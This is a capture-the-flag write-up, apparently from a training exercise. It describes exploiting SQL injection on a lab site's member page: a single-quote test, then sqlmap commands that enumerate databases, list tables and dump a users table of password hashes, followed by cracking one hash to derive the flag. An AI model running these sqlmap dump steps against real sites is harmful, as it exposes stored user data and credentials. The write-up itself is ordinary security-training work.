# SQL injection
The member page [http://10.203.72.119/?page=member](http://10.203.72.119/?page=member "member page") is vunerable to ***sql injection***

If we submit a ***'*** as the member id 
[http://10.203.72.119/?page=member&id=%27&Submit=Submit#](http://10.203.72.119/?page=member&id=%27&Submit=Submit#)

>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1

We can then use ***sqlmap***, which with this command.
``` bash
sqlmap -u '10.203.72.119/?page=members&id=1'
```
We then discover that we have differnt types of sql injections that can be used to penetrate this web application, types listed as follows
1. Boolean-based blind sql
1. Error-based
1. Time-based blind
1. Union query

Futhering this process we then check the names of the databases they have, achived using the command
```bash
sqlmap -u '10.203.72.119/?page=members&id=1' --dbs
```
We then get this output
```bash
[03:54:15] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.5
[03:54:15] [INFO] fetching database names
available databases [6]:
[*] information_schema
[*] Member_Brute_Force
[*] Member_guestbook
[*] Member_images
[*] Member_Sql_Injection
[*] Member_survey
```
Or we can use the command below to get a detailed database and its tables.
``` bash
sqlmap -u '10.203.72.119/?page=members&id=1' -tables
```
Which will show us that there is a table named users, and this is were all the passwords are. Below is the output for this command where we find the 
```bash
Database: Member_Sql_Injection
[1 table]
+---------------------------------------+
| users                                 |
+---------------------------------------+
```
We then look futher in the users table, to see some sensitive information, we use following command to ***dump*** the table to see whats in it.
``` bash
sqlmap -u '10.203.72.119/?page=members&id=1' -T users --dump
```
results

``` bash
Database: Member_Sql_Injection
Table: users
[4 entries]
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+----------------------------------+
| user_id | town      | planet | country   | last_name | first_name     | Commentaire                                                                   | countersign                      |
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+----------------------------------+
| 1       | Honolulu  | EARTH  | America   | Obama     | Barack Hussein | Amerca !                                                                      | 2b3366bcfd44f540e630d4dc2b9b06d9 |
| 2       | Berlin    | Earth  | Allemagne | Hitler    | Adolf          | Ich spreche kein Deutsch.                                                     | 60e9032c586fb422e2c16dee6286cf10 |
| 3       | Moscou    | Earth  | Russia    | Staline   | Joseph         | ????? ????????????? ?????????                                                 | e083b24a01c483437bcf4a9eea7c1b4d |
| 5       | 42        | 42     | 42        | GetThe    | Flag           | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28 |
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+----------------------------------+
```
We then follow the instructions to decrypt the password, which decrypts to ***FortyTwo***, then lower all characters to ***fortytwo***. Then converted to sh256 will result to ***10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5*** which is the flag

## Manipulation

## Solution


